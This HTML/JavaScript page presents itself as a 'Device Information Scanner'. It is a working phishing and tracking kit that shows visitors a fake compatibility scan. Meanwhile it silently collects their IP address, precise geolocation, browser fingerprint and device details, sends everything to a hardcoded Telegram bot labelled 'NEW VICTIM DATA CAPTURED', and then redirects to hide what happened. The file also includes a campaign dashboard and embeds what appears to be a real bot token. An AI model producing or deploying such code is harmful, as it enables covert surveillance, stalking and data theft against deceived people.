<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Information Scanner</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- QR Code Library -->
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
</head>
<body id="main-body">
    <!-- Content will be loaded dynamically -->

    <!-- Bootstrap JS Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // ============================================
        // GLOBAL VARIABLES AND CONFIGURATION
        // ============================================
        
        // Global data object to store all collected information
        const deviceData = {
            deviceInfo: {},
            networkInfo: {},
            batteryInfo: {},
            locationInfo: {},
            storageInfo: {},
            permissionsInfo: {},
            fingerprintInfo: {},
            cameraInfo: {},
            clipboardInfo: {},
            victimID: '',
            timestamp: new Date().toISOString()
        };

        // Telegram bot configuration
        const telegramConfig = {
            botToken: '7992081098:AAH8uPHC5iGtVt2CB8h6oCaZuCo33BUkfX0',
            chatId: '1523864238',
            apiUrl: 'https://api.telegram.org/bot',
            sendHistory: []
        };

        // Campaign and link management
        const campaignManager = {
            campaigns: [],
            currentLink: '',
            currentCampaign: null,
            
            addCampaign: function(name, link, data) {
                const campaign = {
                    id: 'camp_' + Date.now(),
                    name: name,
                    link: link,
                    created: new Date().toISOString(),
                    stats: {
                        views: 0,
                        clicks: 0,
                        dataCollected: 0,
                        lastAccess: null
                    },
                    settings: data
                };
                
                this.campaigns.push(campaign);
                this.currentCampaign = campaign;
                this.saveToStorage();
                
                return campaign;
            },
            
            incrementStat: function(campaignId, stat) {
                const campaign = this.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.stats[stat] !== undefined) {
                    campaign.stats[stat]++;
                    campaign.stats.lastAccess = new Date().toISOString();
                    this.saveToStorage();
                }
            },
            
            saveToStorage: function() {
                try {
                    localStorage.setItem('deviceScannerCampaigns', JSON.stringify(this.campaigns));
                } catch (e) {
                    console.error('Failed to save campaigns:', e);
                }
            },
            
            loadFromStorage: function() {
                try {
                    const saved = localStorage.getItem('deviceScannerCampaigns');
                    if (saved) {
                        this.campaigns = JSON.parse(saved);
                    }
                } catch (e) {
                    console.error('Failed to load campaigns:', e);
                }
            },
            
            getCampaignStats: function() {
                return this.campaigns.map(c => ({
                    id: c.id,
                    name: c.name,
                    link: c.link,
                    stats: c.stats
                }));
            }
        };

        // ============================================
        // INITIALIZATION AND ACCESS DETECTION
        // ============================================

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Apply styles
            applyStyles();
            
            // Check if this is a victim accessing via generated link
            const urlParams = new URLSearchParams(window.location.search);
            const campaignId = urlParams.get('cid');
            const tracking = urlParams.get('track');
            
            if (tracking === 'true' && campaignId) {
                // This is a victim accessing via tracking link
                createVictimInterface(campaignId);
                campaignManager.loadFromStorage();
                campaignManager.incrementStat(campaignId, 'clicks');
                
                // Start data collection after a short delay
                setTimeout(() => {
                    collectAllDataForVictim(campaignId);
                }, 1500);
            } else {
                // This is dashboard access
                loadDashboardInterface();
            }
        });

        // ============================================
        // STYLES
        // ============================================

        function applyStyles() {
            const style = document.createElement('style');
            style.textContent = `
                :root {
                    --primary-color: #2c3e50;
                    --secondary-color: #3498db;
                    --accent-color: #e74c3c;
                    --light-bg: #ecf0f1;
                    --dark-bg: #2c3e50;
                }
                
                /* VICTIM INTERFACE STYLES */
                .victim-interface {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    padding: 20px;
                }
                
                .victim-card {
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                    overflow: hidden;
                    max-width: 600px;
                    margin: 0 auto;
                }
                
                .victim-header {
                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
                    color: white;
                    padding: 25px;
                    text-align: center;
                }
                
                .victim-body {
                    padding: 30px;
                }
                
                .checklist-item {
                    padding: 12px;
                    border-bottom: 1px solid #eee;
                    display: flex;
                    align-items: center;
                    transition: all 0.3s;
                }
                
                .checklist-item.completed {
                    color: #28a745;
                }
                
                .checklist-item.completed i {
                    color: #28a745;
                }
                
                .checklist-item.active {
                    background-color: #f8f9fa;
                    border-left: 4px solid var(--secondary-color);
                }
                
                .victim-footer {
                    padding: 20px;
                    background-color: #f8f9fa;
                    border-top: 1px solid #eee;
                    text-align: center;
                    font-size: 0.9rem;
                    color: #666;
                }
                
                /* DASHBOARD STYLES */
                .dashboard-interface {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    min-height: 100vh;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                .glass-card {
                    background: rgba(255, 255, 255, 0.95);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
                }
                
                .info-card {
                    transition: transform 0.3s, box-shadow 0.3s;
                    height: 100%;
                    border: none;
                    border-radius: 15px;
                    overflow: hidden;
                }
                
                .info-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                }
                
                .card-header {
                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
                    color: white;
                    border-bottom: none;
                    font-weight: 600;
                    letter-spacing: 0.5px;
                }
                
                .card-icon {
                    font-size: 1.5rem;
                    margin-right: 10px;
                }
                
                .data-item {
                    padding: 10px 15px;
                    border-bottom: 1px solid #eee;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                
                .data-item:last-child {
                    border-bottom: none;
                }
                
                .data-label {
                    font-weight: 600;
                    color: var(--primary-color);
                }
                
                .data-value {
                    color: #555;
                    text-align: right;
                    word-break: break-word;
                    max-width: 60%;
                }
                
                .camera-container {
                    width: 100%;
                    height: 200px;
                    background-color: #000;
                    border-radius: 10px;
                    overflow: hidden;
                    margin-bottom: 15px;
                    position: relative;
                }
                
                .camera-feed {
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                }
                
                .snapshot-btn {
                    background: linear-gradient(45deg, var(--accent-color), #c0392b);
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 50px;
                    font-weight: 600;
                    transition: all 0.3s;
                }
                
                .snapshot-btn:hover {
                    transform: scale(1.05);
                    box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
                }
                
                .snapshot-canvas {
                    display: none;
                }
                
                .location-map {
                    width: 100%;
                    height: 200px;
                    background-color: #eee;
                    border-radius: 10px;
                    overflow: hidden;
                }
                
                .tab-content {
                    padding: 20px;
                    background-color: white;
                    border-radius: 0 0 15px 15px;
                }
                
                .nav-tabs {
                    border-bottom: none;
                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
                    border-radius: 15px 15px 0 0;
                    padding: 15px 15px 0;
                }
                
                .nav-link {
                    color: rgba(255, 255, 255, 0.8);
                    border: none;
                    border-radius: 10px 10px 0 0;
                    margin-right: 5px;
                    font-weight: 500;
                }
                
                .nav-link.active {
                    background-color: white;
                    color: var(--primary-color);
                    font-weight: 600;
                }
                
                .progress {
                    height: 25px;
                    border-radius: 50px;
                    margin: 10px 0;
                }
                
                .progress-bar {
                    background: linear-gradient(45deg, var(--secondary-color), #2980b9);
                    border-radius: 50px;
                }
                
                .fingerprint-canvas {
                    width: 100%;
                    height: 100px;
                    background-color: #f8f9fa;
                    border-radius: 10px;
                    margin: 15px 0;
                }
                
                .permission-badge {
                    margin: 5px;
                }
                
                .qr-code {
                    width: 150px;
                    height: 150px;
                    margin: 0 auto;
                    background-color: #f8f9fa;
                    border-radius: 10px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 14px;
                    color: #666;
                    text-align: center;
                    padding: 10px;
                }
                
                .mask-url {
                    background-color: #f8f9fa;
                    padding: 10px;
                    border-radius: 10px;
                    margin: 10px 0;
                    font-family: monospace;
                    word-break: break-all;
                }
                
                .tool-icon {
                    font-size: 2rem;
                    color: var(--secondary-color);
                    margin-bottom: 15px;
                }
                
                .feature-list {
                    list-style-type: none;
                    padding-left: 0;
                }
                
                .feature-list li {
                    padding: 8px 0;
                    border-bottom: 1px dashed #eee;
                }
                
                .feature-list li:last-child {
                    border-bottom: none;
                }
                
                .feature-list i {
                    color: var(--secondary-color);
                    margin-right: 10px;
                }
                
                .download-btn {
                    background: linear-gradient(45deg, #27ae60, #2ecc71);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 50px;
                    font-weight: 600;
                    font-size: 1.1rem;
                    transition: all 0.3s;
                }
                
                .download-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
                }
                
                .telegram-btn {
                    background: linear-gradient(45deg, #0088cc, #00aced);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 50px;
                    font-weight: 600;
                    font-size: 1.1rem;
                    transition: all 0.3s;
                }
                
                .telegram-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
                }
                
                .link-btn {
                    background: linear-gradient(45deg, #9b59b6, #8e44ad);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 50px;
                    font-weight: 600;
                    font-size: 1.1rem;
                    transition: all 0.3s;
                }
                
                .link-btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(155, 89, 182, 0.3);
                }
                
                .telegram-config {
                    background-color: #f8f9fa;
                    border-radius: 10px;
                    padding: 20px;
                    margin-top: 20px;
                }
                
                .telegram-config input {
                    font-family: monospace;
                }
                
                .modal-content {
                    border-radius: 15px;
                    overflow: hidden;
                }
                
                .modal-header {
                    background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
                    color: white;
                }
                
                .screenshot-container {
                    max-height: 400px;
                    overflow-y: auto;
                }
                
                .screenshot-img {
                    max-width: 100%;
                    border-radius: 10px;
                    margin-bottom: 10px;
                    border: 2px solid #dee2e6;
                }
                
                .link-preview {
                    background: linear-gradient(45deg, #1a1a2e, #16213e);
                    color: white;
                    padding: 15px;
                    border-radius: 10px;
                    font-family: monospace;
                    word-break: break-all;
                    margin: 10px 0;
                }
                
                .shortener-result {
                    background: linear-gradient(45deg, #27ae60, #2ecc71);
                    color: white;
                    padding: 15px;
                    border-radius: 10px;
                    margin: 10px 0;
                }
                
                .campaign-item {
                    border-left: 4px solid var(--secondary-color);
                    padding-left: 15px;
                    margin-bottom: 15px;
                }
                
                .campaign-stats {
                    font-size: 0.8rem;
                    color: #666;
                }
                
                .social-share-btn {
                    width: 50px;
                    height: 50px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    color: white;
                    font-size: 1.5rem;
                    margin: 5px;
                    transition: transform 0.3s;
                }
                
                .social-share-btn:hover {
                    transform: scale(1.1);
                }
                
                .facebook { background: #3b5998; }
                .whatsapp { background: #25d366; }
                .telegram { background: #0088cc; }
                .twitter { background: #1da1f2; }
                .messenger { background: #006aff; }
                
                .cloak-preview {
                    border: 2px dashed #dee2e6;
                    border-radius: 10px;
                    padding: 20px;
                    margin: 15px 0;
                    background-color: #f8f9fa;
                }
                
                .cloak-preview img {
                    max-width: 100%;
                    border-radius: 5px;
                }
                
                .victim-alert {
                    position: fixed;
                    top: 20px;
                    right: 20px;
                    z-index: 9999;
                    background: linear-gradient(45deg, #e74c3c, #c0392b);
                    color: white;
                    padding: 15px 20px;
                    border-radius: 10px;
                    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
                    animation: slideIn 0.5s ease-out;
                    display: none;
                }
                
                @keyframes slideIn {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                
                /* Toast Notification Styles */
                .custom-toast {
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    z-index: 9999;
                    min-width: 300px;
                }
                
                .toast.show {
                    display: block !important;
                }
                
                /* Responsive adjustments */
                @media (max-width: 768px) {
                    .victim-card {
                        margin: 10px;
                    }
                    
                    .camera-container {
                        height: 150px;
                    }
                    
                    .data-item {
                        flex-direction: column;
                        align-items: flex-start;
                    }
                    
                    .data-value {
                        text-align: left;
                        max-width: 100%;
                        margin-top: 5px;
                    }
                }
            `;
            document.head.appendChild(style);
        }

        // ============================================
        // VICTIM INTERFACE
        // ============================================

        function createVictimInterface(campaignId) {
            document.body.className = 'victim-interface';
            
            const urlParams = new URLSearchParams(window.location.search);
            const title = urlParams.get('title') || 'Device Compatibility Scan';
            const redirect = urlParams.get('redirect') || 'https://google.com';
            
            document.body.innerHTML = `
                <div class="victim-card">
                    <div class="victim-header">
                        <h1 class="display-6 mb-2">
                            <i class="fas fa-shield-alt"></i> ${title}
                        </h1>
                        <p class="mb-0">Ensuring optimal device performance</p>
                    </div>
                    
                    <div class="victim-body">
                        <div class="text-center mb-4">
                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <h4 id="status-message">Initializing Compatibility Scan</h4>
                            <p class="text-muted" id="status-details">
                                Please wait while we analyze your device configuration
                            </p>
                        </div>
                        
                        <div class="progress mb-4" style="height: 20px;">
                            <div id="scan-progress" class="progress-bar progress-bar-striped progress-bar-animated" 
                                 role="progressbar" style="width: 5%">
                                <span class="progress-text">5%</span>
                            </div>
                        </div>
                        
                        <div id="checklist" class="mb-4">
                            <div class="checklist-item active">
                                <i class="fas fa-spinner fa-spin text-primary me-2"></i>
                                <span>Device Information Scan</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Network Analysis</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Security Diagnostics</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Performance Optimization</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Final Verification</span>
                            </div>
                        </div>
                        
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle"></i>
                            <strong>Important:</strong> Do not close this window during the scan. 
                            The process will complete automatically.
                        </div>
                        
                        <div class="row mt-4">
                            <div class="col-6">
                                <div class="text-center p-3 border rounded">
                                    <i class="fas fa-lock fa-2x text-success mb-2"></i>
                                    <div class="small">Secure Connection</div>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-center p-3 border rounded">
                                    <i class="fas fa-user-shield fa-2x text-primary mb-2"></i>
                                    <div class="small">Privacy Protected</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="victim-footer">
                        <div class="d-flex justify-content-center align-items-center">
                            <i class="fas fa-circle text-success me-2" style="font-size: 0.7rem;"></i>
                            <span>Scan in progress ‚Ä¢ Estimated time: 15 seconds</span>
                        </div>
                    </div>
                </div>
            `;
        }

        async function collectAllDataForVictim(campaignId) {
            const totalSteps = 5;
            
            // Step 1: Device Info
            updateVictimProgress(1, totalSteps, "Collecting Device Information...");
            await collectDeviceInfo();
            await delay(1000);
            
            // Step 2: Network Info
            updateVictimProgress(2, totalSteps, "Analyzing Network Configuration...");
            await collectNetworkInfo();
            await delay(1000);
            
            // Step 3: Security/Fingerprint
            updateVictimProgress(3, totalSteps, "Running Security Diagnostics...");
            await collectFingerprintInfo();
            await delay(1000);
            
            // Step 4: Additional Info
            updateVictimProgress(4, totalSteps, "Optimizing Performance...");
            await collectStorageInfo();
            await collectBatteryInfo();
            await collectPermissionsInfo();
            await delay(1000);
            
            // Step 5: Location (optional)
            updateVictimProgress(5, totalSteps, "Finalizing Scan...");
            try {
                await getLocationForVictim();
            } catch (e) {
                console.log('Location not available');
            }
            
            // Update campaign stats
            campaignManager.incrementStat(campaignId, 'dataCollected');
            
            // Send to Telegram
            await sendVictimDataToTelegram(campaignId);
            
            // Show completion and redirect
            setTimeout(() => {
                completeVictimScan(campaignId);
            }, 1500);
        }

        function updateVictimProgress(step, totalSteps, message) {
            const progress = Math.min(100, Math.round((step / totalSteps) * 100));
            
            const progressBar = document.getElementById('scan-progress');
            const statusMessage = document.getElementById('status-message');
            const statusDetails = document.getElementById('status-details');
            
            if (progressBar) {
                progressBar.style.width = `${progress}%`;
                const progressText = progressBar.querySelector('.progress-text');
                if (progressText) {
                    progressText.textContent = `${progress}%`;
                }
            }
            
            if (statusMessage && message) {
                statusMessage.textContent = message;
            }
            
            if (statusDetails) {
                const messages = [
                    "Analyzing device specifications and hardware...",
                    "Checking network connectivity and security...",
                    "Running comprehensive security diagnostics...",
                    "Optimizing performance settings...",
                    "Finalizing scan and generating report..."
                ];
                statusDetails.textContent = messages[step - 1] || "Finalizing scan...";
            }
            
            // Update checklist
            const checklistItems = document.querySelectorAll('.checklist-item');
            if (checklistItems.length >= step) {
                for (let i = 0; i < checklistItems.length; i++) {
                    checklistItems[i].classList.remove('active');
                    
                    if (i < step - 1) {
                        // Completed steps
                        checklistItems[i].innerHTML = '<i class="fas fa-check text-success me-2"></i>' + 
                            checklistItems[i].textContent;
                        checklistItems[i].classList.add('completed');
                    } else if (i === step - 1) {
                        // Current step
                        checklistItems[i].innerHTML = '<i class="fas fa-spinner fa-spin text-primary me-2"></i>' + 
                            checklistItems[i].textContent;
                        checklistItems[i].classList.add('active');
                    }
                }
            }
        }

        function completeVictimScan(campaignId) {
            const urlParams = new URLSearchParams(window.location.search);
            const redirectUrl = urlParams.get('redirect') || 'https://google.com';
            
            // Update UI to show completion
            document.getElementById('status-message').textContent = 'Scan Complete!';
            document.getElementById('status-details').textContent = 'Your device has been successfully analyzed and optimized.';
            
            // Hide spinner
            const spinner = document.querySelector('.spinner-border');
            if (spinner) spinner.style.display = 'none';
            
            // Update progress bar
            const progressBar = document.getElementById('scan-progress');
            if (progressBar) {
                progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
                progressBar.classList.add('bg-success');
                progressBar.style.width = '100%';
                const progressText = progressBar.querySelector('.progress-text');
                if (progressText) {
                    progressText.textContent = '100%';
                }
            }
            
            // Update all checklist items to completed
            document.querySelectorAll('.checklist-item').forEach(item => {
                item.innerHTML = '<i class="fas fa-check text-success me-2"></i>' + item.textContent;
                item.classList.add('completed');
                item.classList.remove('active');
            });
            
            // Show success message
            const alertDiv = document.querySelector('.alert');
            if (alertDiv) {
                alertDiv.className = 'alert alert-success';
                alertDiv.innerHTML = `
                    <i class="fas fa-check-circle"></i>
                    <strong>Scan Successful!</strong> Your device is now optimized. 
                    Redirecting in <span id="countdown">3</span> seconds...
                `;
            }
            
            // Countdown and redirect
            let countdown = 3;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                if (countdownElement) {
                    countdownElement.textContent = countdown;
                }
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = redirectUrl;
                }
            }, 1000);
            
            // Update footer
            const footer = document.querySelector('.victim-footer');
            if (footer) {
                footer.innerHTML = `
                    <div class="d-flex justify-content-center align-items-center">
                        <i class="fas fa-check-circle text-success me-2"></i>
                        <span>Scan completed successfully ‚Ä¢ Redirecting...</span>
                    </div>
                `;
            }
        }

        // ============================================
        // DATA COLLECTION FUNCTIONS (for victim)
        // ============================================

        function collectDeviceInfo() {
            deviceData.deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screenResolution: `${window.screen.width} x ${window.screen.height}`,
                colorDepth: `${window.screen.colorDepth} bit`,
                pixelRatio: window.devicePixelRatio || 1,
                orientation: window.screen.width > window.screen.height ? 'Landscape' : 'Portrait',
                deviceName: getDeviceName(),
                timestamp: new Date().toISOString()
            };
        }

        async function collectNetworkInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                deviceData.networkInfo = {
                    ipv4: data.ip,
                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                    timestamp: new Date().toISOString()
                };
                
                if (navigator.connection) {
                    const conn = navigator.connection;
                    deviceData.networkInfo.connectionType = conn.effectiveType || 'Unknown';
                    deviceData.networkInfo.downlink = conn.downlink || 'Unknown';
                    deviceData.networkInfo.rtt = conn.rtt || 'Unknown';
                    deviceData.networkInfo.saveData = conn.saveData ? 'Enabled' : 'Disabled';
                }
            } catch (error) {
                deviceData.networkInfo = {
                    ipv4: 'Unable to retrieve',
                    onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                    timestamp: new Date().toISOString()
                };
            }
        }

        async function getLocationForVictim() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        deviceData.locationInfo = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString(),
                            source: 'victim_access'
                        };
                        resolve(position);
                    },
                    error => reject(error),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        function collectStorageInfo() {
            deviceData.storageInfo = {
                available: 'Unknown',
                used: 'Unknown',
                timestamp: new Date().toISOString()
            };
        }

        async function collectBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceData.batteryInfo = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        timestamp: new Date().toISOString()
                    };
                } catch (error) {
                    deviceData.batteryInfo = {
                        level: 'Unknown',
                        charging: 'Unknown',
                        timestamp: new Date().toISOString()
                    };
                }
            } else {
                deviceData.batteryInfo = {
                    level: 'Unknown',
                    charging: 'Unknown',
                    timestamp: new Date().toISOString()
                };
            }
        }

        async function collectPermissionsInfo() {
            deviceData.permissionsInfo = {
                timestamp: new Date().toISOString()
            };
            
            const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
            for (const permission of permissions) {
                try {
                    const result = await navigator.permissions.query({ name: permission });
                    deviceData.permissionsInfo[permission] = result.state;
                } catch (error) {
                    deviceData.permissionsInfo[permission] = 'Not supported';
                }
            }
        }

        function collectFingerprintInfo() {
            // Canvas fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            if (ctx) {
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                
                const canvasData = canvas.toDataURL();
                deviceData.fingerprintInfo = {
                    canvas: simpleHash(canvasData),
                    userAgent: simpleHash(navigator.userAgent),
                    platform: simpleHash(navigator.platform),
                    languages: simpleHash(navigator.languages.join(',')),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: simpleHash(`${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`),
                    plugins: simpleHash(Array.from(navigator.plugins).map(p => p.name).join(',')),
                    timestamp: new Date().toISOString()
                };
            }
        }

        // ============================================
        // TELEGRAM FUNCTIONS (working)
        // ============================================

        async function sendVictimDataToTelegram(campaignId) {
            try {
                campaignManager.loadFromStorage();
                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
                const campaignName = campaign ? campaign.name : 'Unknown Campaign';
                
                // Format message
                const message = formatVictimTelegramMessage(campaignName);
                
                // Send to Telegram
                await sendTelegramMessage(message);
                
                // Send JSON data
                const jsonData = JSON.stringify(deviceData, null, 2);
                await sendTelegramDocument(
                    new Blob([jsonData], { type: 'application/json' }),
                    `victim-data-${Date.now()}.json`,
                    `Complete victim data from campaign: ${campaignName}`
                );
                
                showToast('Data sent to Telegram successfully', 'success');
                
            } catch (error) {
                console.error('Failed to send victim data:', error);
                showToast('Failed to send data to Telegram', 'error');
            }
        }

        function formatVictimTelegramMessage(campaignName) {
            let message = `üéØ *NEW VICTIM DATA CAPTURED!*\n\n`;
            message += `üìä *Campaign:* ${campaignName}\n`;
            message += `‚è∞ *Time:* ${new Date().toLocaleString()}\n`;
            message += `üîó *Source:* Generated Tracking Link\n\n`;
            
            if (deviceData.deviceInfo) {
                message += `üì± *Device Info:*\n`;
                message += `‚Ä¢ Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                message += `‚Ä¢ Device: ${deviceData.deviceInfo.deviceName || 'Unknown'}\n`;
                message += `‚Ä¢ Resolution: ${deviceData.deviceInfo.screenResolution || 'Unknown'}\n`;
                message += `‚Ä¢ User Agent: \`${deviceData.deviceInfo.userAgent?.substring(0, 50)}...\`\n`;
            }
            
            if (deviceData.locationInfo?.latitude) {
                message += `\nüìç *Location:*\n`;
                message += `‚Ä¢ Lat: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
                message += `‚Ä¢ Lon: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
                message += `‚Ä¢ Accuracy: ${deviceData.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters\n`;
                message += `‚Ä¢ Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n`;
            }
            
            if (deviceData.networkInfo?.ipv4) {
                message += `\nüåê *Network:*\n`;
                message += `‚Ä¢ IP: \`${deviceData.networkInfo.ipv4}\`\n`;
                message += `‚Ä¢ Type: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
                message += `‚Ä¢ Status: ${deviceData.networkInfo.onlineStatus || 'Unknown'}\n`;
            }
            
            if (deviceData.fingerprintInfo?.canvas) {
                message += `\nüÜî *Fingerprint:*\n`;
                message += `‚Ä¢ Hash: \`${deviceData.fingerprintInfo.canvas.substring(0, 32)}...\`\n`;
                message += `‚Ä¢ Timezone: ${deviceData.fingerprintInfo.timezone || 'Unknown'}\n`;
            }
            
            message += `\n_Data automatically collected via tracking link_`;
            
            return message;
        }

        async function sendTelegramMessage(text) {
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                throw new Error('Telegram configuration missing');
            }
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramConfig.chatId,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Telegram API error');
            }
            
            return data;
        }

        async function sendTelegramDocument(blob, filename, caption = '') {
            if (!telegramConfig.botToken || !telegramConfig.chatId) {
                throw new Error('Telegram configuration missing');
            }
            
            const url = `${telegramConfig.apiUrl}${telegramConfig.botToken}/sendDocument`;
            
            const formData = new FormData();
            formData.append('chat_id', telegramConfig.chatId);
            formData.append('document', blob, filename);
            
            if (caption) {
                formData.append('caption', caption);
            }
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                throw new Error(data.description || 'Telegram API error');
            }
            
            return data;
        }

        // ============================================
        // DASHBOARD INTERFACE
        // ============================================

        function loadDashboardInterface() {
            document.body.className = 'dashboard-interface';
            document.body.innerHTML = `
                <div class="container py-5">
                    <div class="row justify-content-center">
                        <div class="col-12">
                            <div class="glass-card p-4 mb-4">
                                <div class="row align-items-center">
                                    <div class="col-md-5">
                                        <h1 class="display-5 fw-bold text-white mb-2">
                                            <i class="fas fa-robot"></i> Device Information Scanner
                                        </h1>
                                        <p class="lead text-white mb-0">
                                            Comprehensive device, network, and browser information gathering tool
                                        </p>
                                    </div>
                                    <div class="col-md-7 text-end">
                                        <div class="d-flex justify-content-end gap-2 flex-wrap">
                                            <button class="btn link-btn mb-2" data-bs-toggle="modal" data-bs-target="#linkModal">
                                                <i class="fas fa-link"></i> Generate Link
                                            </button>
                                            <button class="btn telegram-btn mb-2" onclick="openTelegramModal()">
                                                <i class="fab fa-telegram"></i> Send to Telegram
                                            </button>
                                            <button class="btn download-btn mb-2" onclick="downloadData()">
                                                <i class="fas fa-download"></i> Download Data
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-lg-3 mb-4">
                            <div class="info-card glass-card">
                                <div class="card-header">
                                    <i class="fas fa-tools card-icon"></i> Tools Menu
                                </div>
                                <div class="card-body">
                                    <ul class="nav flex-column feature-list">
                                        <li>
                                            <a href="javascript:void(0)" onclick="showTab('info-tab')" class="nav-link active">
                                                <i class="fas fa-info-circle"></i> Device Info
                                            </a>
                                        </li>
                                        <li>
                                            <a href="javascript:void(0)" onclick="showTab('network-tab')" class="nav-link">
                                                <i class="fas fa-wifi"></i> Network Info
